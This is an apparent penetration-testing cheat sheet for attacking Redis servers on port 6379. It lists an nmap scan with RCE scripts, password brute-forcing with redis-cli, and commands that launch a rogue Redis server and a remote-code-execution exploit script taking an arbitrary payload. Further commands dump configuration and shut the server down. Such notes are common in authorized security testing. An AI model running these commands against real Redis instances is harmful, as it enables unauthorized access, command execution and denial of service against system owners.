# Redis

Port 6379

### 1) Nmap Scan

    nmap -p 6379 --script "redis-info,redis-rce" IP

### 2) Brute force

    redis-cli -h <ip> -p 6379 -a <password_to_try>

### 3) Exploitation

Run a Redis rogue server to capture data or execute commands

Link: https://github.com/n0b0dyCN/redis-rogue-server

    python3 redis-rogue-server.py -p 6379

Run Redis RCE exploit using a custom script (replace 'payload' with the desired payload)

Link: https://github.com/jas502n/Redis-RCE

    python3 redis-rce-exploit.py -h IP -p 6379 -c "payload"

### 4) Connection

    redis-cli -h IP -p 6379

### 5) Interaction

List databases and their keys (Select database number is 0 by default)

    info
    keys *
    select DB_NUM

View all configuration options

    config get *

More example commands

    set mykey myvalue
    get mykey

Shutdown the Redis server

    shutdown
